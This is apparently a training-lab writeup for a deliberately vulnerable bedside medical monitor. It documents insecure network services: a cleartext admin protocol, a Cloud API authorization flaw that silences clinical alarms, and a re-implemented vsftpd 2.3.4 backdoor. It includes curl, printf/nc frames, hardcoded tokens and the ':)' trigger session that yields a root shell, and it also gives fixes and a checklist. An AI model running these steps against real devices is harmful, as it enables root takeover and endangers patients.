---
id: IoT:I2
title: "Insecure Network Services"
category: IoT
status: PENDING
severity: Critical
owasp: "IoT I2 — Insecure Network Services"
cwe: "CWE-1104 (Use of Unmaintained Third-Party Components) / CWE-912 (Hidden Functionality) / CWE-78 (OS Command Injection) / CWE-306 (Missing Authentication) / CWE-319 (Cleartext Transmission)"
source_docs:
  - "CareOtter_IoT.md §IoT:I2 (2.1 + 2.2 migrated)"
  - "stages/01_spec/output/IoT-I2-ftp-rce-spec.md (2.3)"
affected_components:
  - "labs/careotter/careservice.c"
  - "labs/careotter/files/opt/medical-sensor/sensor_service.py"
  - "labs/careotter/careotter-ftp.c"
  - "labs/careotter/files/etc/init.d/careotter-ftp"
  - "labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh"
  - "labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/75-firewall.sh"
verified_date: ""
---

# IoT:I2 — Insecure Network Services

> **Status:** PENDING (§2.1 + §2.2 DONE, §2.3 PENDING — the legacy-FTP RCE is implemented in source but not yet verified on the Pi)
> **OWASP:** IoT I2 — Insecure Network Services
> **CWE:** CWE-1104 / CWE-912 / CWE-78 / CWE-306 / CWE-319
> **Severity:** Critical

---

## Why It Matters

The CareOtter bedside monitor is a device that sits on the patient's home WiFi and runs several network services to expose its medical functions. OWASP IoT I2 is about those services being unnecessary, unauthenticated, unencrypted, or running outdated software with known exploits. On a device that controls cardiac telemetry and therapy thresholds, a single exposed service is the difference between a monitored patient and a fully compromised implant gateway.

This device gets I2 wrong in three escalating ways: an admin protocol that ships secrets in cleartext (§2.1), an HTTP service whose life-safety threshold control is reachable through a Cloud API authorization flaw (§2.2), and a forgotten legacy FTP daemon that hands an unauthenticated attacker a **root shell** (§2.3). The firewall amplifies all of them.

---

## The exposed surface

The monitor's firewall hook (`75-firewall.sh`) is the force multiplier. It rebuilds `/etc/config/firewall` fully permissive on the WAN side — `input=ACCEPT`, masquerade and bidirectional `lan <-> wan` forwarding (the medical monitor acts as an open router) — and **pre-opens roughly fifteen medical and IoT service ports from the WAN with no daemon behind most of them**.

```sh
# 75-firewall.sh (excerpt) — every one of these is reachable from the home WiFi
add_rule 'Allow-SSH'    'tcp' '22'
add_rule 'Allow-Telnet' 'tcp' '23'
add_rule 'Allow-FTP'    'tcp' '21'          # <-- §2.3 lives here
add_rule 'Allow-SNMP'   'udp' '161 162'
add_rule 'Allow-MQTT'   'tcp' '1883 8883'
add_rule 'Allow-HL7'    'tcp' '2575'
add_rule 'Allow-DICOM'  'tcp' '104 11112'
add_rule 'Allow-Modbus' 'tcp' '502'
add_rule 'Allow-UPnP-SSDP' 'udp' '1900'
# … plus CoAP, mDNS, RTSP, NetBIOS/SMB …
```

An open port with no service is "merely" attack surface waiting to be filled. An open port with an outdated service is an exploit. The listening services today:

| Port | Protocol | Service | Auth | Sub-vector |
|------|----------|---------|------|-----------|
| 8081 | HTTP | `sensor_service.py` — vitals + thresholds | X-API-Key (hardcoded) | §2.2 |
| 9999 | TCP / IGP v4 | `careservice` — device administration | Hardcoded token, **cleartext** | §2.1 |
| 21 | FTP | `careotter-ftp` — vendor field-service FTP | **None** (backdoored release) | §2.3 |
| 22 | SSH | dropbear (base image) | **RootPasswordAuth on** | baseline (config smell) |
| 8080 | HTTP | uHTTPd Device Manager (base) | — (`rfc1918_filter 0`, CGI) | baseline |
| BLE | GATT | `ble_server.py` | None | see IoT:I3 |

> The careservice on `:9999` is itself an insecure network service with memory-corruption RCE (format string, integer-underflow stack overflow, command injection — see IoT:I7/I9). It is documented under code-quality, but it is textbook I2 too. This page focuses on the transport/auth/version failures of the surface as a whole.

---

## 2.1 — IGP admin service in cleartext (no transport encryption)

**Status:** DONE

The administration service listens on TCP `:9999` with no TLS. Every command — including the authentication token and the full WiFi configuration (SSID + PSK) — travels in cleartext over the link.

![[iot2_2.1_IGP.png]]

A passive observer on the `192.168.2.0/24` segment captures the admin token and the WiFi PSK with a single `tcpdump` session, then replays the token to take over administration.

## 2.2 — HTTP sensor service is API-key gated, and the threshold bypass is the Cloud API BFLA

**Status:** DONE

Port `:8081` exposes vitals, history, config and a `POST /thresholds` endpoint. Every endpoint except `/health` requires an `X-API-Key` header (`sensor_service.py` `_check_auth`), so a direct unauthenticated request to the device is rejected:

```bash
$ curl -s -X POST http://192.168.2.1:8081/thresholds \
    -H "Content-Type: application/json" \
    -d '{"bpm_min": 0, "bpm_max": 255, "spo2_min": 0}'
{"error": "unauthorized", "X-API-Key": "invalid"}
```

The auth is weak rather than absent. The key is a hardcoded factory value (`config.json` `api_key` = `careotter-2024-lab`) compared with a non-constant-time `==`, but it is enforced on every data and control endpoint.

Silencing the alarms does not happen on the device. It happens one layer up, at the Cloud API. `POST /api/config/thresholds` is guarded by the wrong decorator (`@token_required` instead of `@admin_required`), so a low-privilege patient JWT is accepted. This is Broken Function Level Authorization, documented in [[API5_Broken_Function_Level_Authorization.md]]. The Cloud API proxies the change to the device over IGP `0x08`, setting `bpm_min=0`, `bpm_max=255`, `spo2_min=0`:

```bash
$ JWT=$(curl -s -X POST http://api.careotter.lab/api/auth/login/patient \
    -H "Content-Type: application/json" \
    -d '{"username":"john_doe","password":"johnny123"}' | jq -r .token)

$ curl -s -X POST -H "Authorization: Bearer $JWT" \
    http://api.careotter.lab/api/config/thresholds \
    -d '{"bpm_min": 0, "bpm_max": 255, "spo2_min": 0}'
{"igp_request":"4341524508000009bb04000000ffcc0100","result":"THRESHOLD_SET","thresholds":{"bpm_max":255,"bpm_min":0,"spo2_min":0}}
```

Disabling every clinical alarm with nothing but a patient token is a direct patient-safety risk. In vulnerable mode the response also leaks the raw `igp_request` frame, which chains into the API4 IGP flood (see `API5` Step 4).

### The cloud BFLA and the device-side risk are two separable controls

The threshold change above is two independent failures on two layers, and fixing one does not fix the other.

1. **Cloud authorization (API5, the BFLA).** The Cloud API let a patient reach an admin-only function. Correcting the decorator to `@admin_required` closes the patient path, but it changes nothing on the device.
2. **Device trust (the IoT risk on this page).** The device-side threshold setter is the careservice IGP `0x08 SET_THRESHOLD` command. Its only gate is the global hardcoded admin token (`OtterMobile2026`, see [[IoT1_Weak_Guessable_Hardcoded_Passwords]]) presented once over the cleartext `:9999` channel (§2.1). The device performs no verification that the bytes reflect a current, authorized decision by a cloud-authenticated user. It writes whatever thresholds arrive from anyone who can speak IGP with that token.

Because the device trusts the channel and not the request, the cloud BFLA is only one path to it. An attacker who never touches the Cloud API, just the leaked IGP token and LAN access to `:9999`, sets the same lethal thresholds directly (the exact frame the Cloud API leaked in its `igp_request`):

```bash
# Authenticate to careservice with the hardcoded token, then SET_THRESHOLD (0x08).
printf '\x43\x41\x52\x45\x02\x00\x00\x0fOtterMobile2026'                 | nc -w2 192.168.2.1 9999
printf '\x43\x41\x52\x45\x08\x00\x00\x09\xbb\x04\x00\x00\x00\xff\xcc\x01\x00' | nc -w2 192.168.2.1 9999
```

So a cloud with a perfectly correct authorization model would still ship a forwarded command to a device that cannot tell the difference, and a perfectly hardened device would still be reachable through the cloud BFLA. They are separate controls, and both are needed.

### What the device service must do to trust a "cloud-authenticated" request

The device cannot delegate all authentication and authorization to the cloud and then trust whatever bytes arrive. To be sure a control command reflects a real, current, authorized cloud user, the device-side service should require the request to carry and prove that authorization, not infer it from the channel:

- **Per-device, rotatable credentials, not a global static token.** Replace the single hardcoded `OtterMobile2026` (identical on every unit, recoverable with `strings`) with a unique key per device that can be revoked and rotated. A shared secret authenticates "someone who has the secret", never "this specific authorized user".
- **A verifiable, scoped authorization artifact per command.** The cloud signs each control command (or issues a short-lived, single-use capability token) with a key the device verifies. The artifact binds the command to the authenticated user's identity and role, to the specific action (set thresholds), and to the target device. The device checks the signature before acting, so a command the cloud should never have authorized carries no valid artifact and is rejected.
- **Mutual authentication of the channel (mTLS).** The device accepts control traffic only from the genuine cloud, and the cloud only from the genuine device. A LAN attacker cannot present a valid cloud certificate, which also closes the direct-IGP path.
- **Anti-replay binding.** Include a nonce, timestamp or sequence number in the signed command so a captured frame cannot be replayed to re-apply lethal thresholds later.
- **Treat network position as untrusted.** "It arrived over IGP from the LAN" is not evidence of authorization. Fail closed when the artifact is missing or invalid.

With these in place the device no longer trusts the cloud's authorization decision blindly. A cloud-side authorization bug cannot silently become a device action, because the device independently verifies that this command was authorized for this action by an authenticated user, and any breach is bounded and auditable.

## 2.3 — Legacy FTP daemon with public RCE (vsftpd 2.3.4 backdoor)

**Status:** DONE

The firewall opens `:21` (`Allow-FTP`), and a vendor "field-service" FTP daemon — the kind real monitors and pumps ship for firmware and log transfer and leave enabled in the field — listens there as **root**. It advertises a years-old version, so one `nmap -sV` hands the attacker a public remote-root exploit.

![[iot2_nmap_ftp.png]]

`vsftpd 2.3.4` is the backdoored 2011 release (CVE-2011-2523). An FTP `USER` argument containing the smiley `:)` makes the daemon bind `/bin/sh` to TCP `:6200`. Because the service runs as root, the shell is **root** — unauthenticated remote code execution on the device that governs the patient's cardiac telemetry and therapy thresholds.

In this particular case, the backdoor found its way into the official source as a result of a supply chain compromise. Between June 30th and July 3rd, 2011, the master download site distributed a tampered `vsftpd-2.3.4.tar.gz` that contained malicious code not present in the author's repository. An attacker with access to the project's distribution server injected a patch into `str.c` that checked if the FTP `USER` argument had `:)`. The trojaned tarball was live for 72 hours until vsftpd's author Chris Evans discovered the intrusion.

In the CareOtter lab, `careotter-ftp.c` is a faithful re-implementation of that same backdoor logic. It advertises `vsftpd 2.3.4` in the banner, parses the `:)` trigger in the username, and spawns a root shell on `:6200`.

```bash
# 1) Trigger the backdoor on the FTP control channel
$ nc 192.168.2.1 21
220 (vsFTPd 2.3.4)
USER pwn:)
331 Please specify the password.
PASS x
230 Login successful.

# 2) Catch the root shell on :6200
$ nc 192.168.2.1 6200
id
uid=0(root) gid=0(root)
```

![[Pasted image 20260612120509.png]]

From that root shell the attacker reads `/etc/config/wireless` (WiFi PSK), rewrites `/tmp/careotter.thresholds` to silence clinical alerts, tampers the `careservice` and sensor processes, or pivots to the Cloud API over the home WiFi. A forgotten, unmaintained network service on an internet-adjacent medical device is one nmap away from full compromise.

In the lab the daemon is a faithful re-implementation of the backdoor (`labs/careotter/careotter-ftp.c`), shipped as a prebuilt aarch64 binary like `careservice` and started by `72-careotter-ftp.sh` on `START=72`. The binary is not stripped, so `nmap -sV` and `strings(1)` reveal the `vsFTPd 2.3.4` version lure.
### Secure mode

The I2 remediation is to **remove** the unnecessary service, not to "patch it later". With UCI `careotter.@careotter[0].ftp_secure=1` the init script does not start `careotter-ftp` — nothing listens on `:21` and the exploit has no target. The toggle mirrors `careservice`'s `secure_mode`.

---

## How It Should Be

- **Decommission what is not needed.** A bedside monitor does not need FTP, Telnet, SNMP, UPnP, HL7, DICOM, Modbus or SMB exposed. Remove the daemons and close the firewall ports — the secure-mode toggle for the FTP service models exactly this.
- **Authenticate every service.** The HTTP sensor (`:8081`) and any control endpoint must require credentials, not trust the local network.
- **Encrypt the transport.** The IGP admin channel (`:9999`) must run over TLS so the token and the WiFi PSK are not sniffable.
- **Keep software current.** No service should run an unmaintained release with a public exploit. Track versions and patch or replace — the `vsftpd 2.3.4` lure is the anti-pattern.
- **Default-deny the edge.** The WAN zone should be `input=REJECT` with an explicit allow-list, not `ACCEPT` with everything pre-opened.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Attack surface | Remove unused daemons, close their firewall ports, WAN default-deny | Eliminate I2 exposure (CWE-1104) |
| Software supply | Inventory service versions, patch/replace unmaintained ones | Kill the public-exploit path (CWE-1104 / CWE-912) |
| AuthN | Credentials on `:8081` and every control endpoint | Stop unauthenticated commands (CWE-306) |
| Transport | TLS on the IGP admin channel `:9999` | Stop token/PSK sniffing (CWE-319) |
| Least privilege | Do not run network daemons as root | Contain a compromised service (CWE-250) |

---

## Verification Checklist

- [ ] **§2.1**: `nmap -p9999` open. A `tcpdump` on the segment captures the IGP token and WiFi PSK in cleartext during an admin session.
- [ ] **§2.2**: direct `POST :8081/thresholds` without `X-API-Key` returns `unauthorized`. The alarm-silencing change is reached via the Cloud API BFLA `POST /api/config/thresholds` with a patient JWT (API5), proxied to the device over IGP.
- [ ] **§2.3 (vulnerable)**: `nmap -sV -p21` → `vsftpd 2.3.4`. `USER x:)` + `PASS x` then `nc <pi> 6200` → `uid=0(root)`.
- [ ] **§2.3 (secure)**: `careotter.@careotter[0].ftp_secure=1` + restart → `:21` closed (`nmap -p21` not open), the `:)` trick has no target.
- [ ] **Firewall**: the WAN zone is `input=ACCEPT` and `Allow-FTP`/`Allow-*` rules are present (the ports are reachable from the home WiFi side).
- [ ] **Binary lure**: `strings /opt/careotter-ftp/careotter-ftp | grep 'vsFTPd 2.3.4'` (binary not stripped).

---

## References

- Migrated from `docs/CareOtter/IoT/CareOtter_IoT.md` §IoT:I2 (2.1, 2.2).
- Spec: `stages/01_spec/output/IoT-I2-ftp-rce-spec.md` (the §2.3 legacy-FTP RCE).
- `labs/careotter/careotter-ftp.c` (the daemon), `files/etc/init.d/careotter-ftp`, `files/usr/lib/vulnzoo-hooks/profile-init.d/72-careotter-ftp.sh`, `opt/careotter-ftp/CONTEXT.md`.
- `labs/careotter/files/usr/lib/vulnzoo-hooks/profile-init.d/75-firewall.sh` (opens `:21` and the rest of the surface).
- CVE-2011-2523 (vsftpd 2.3.4 backdoor)
- Related: `IoT1_Weak_Guessable_Hardcoded_Passwords.md` (the IGP token), CareOtter_IoT.md §IoT:I7/I9 (the careservice memory-corruption RCEs — also I2-class).
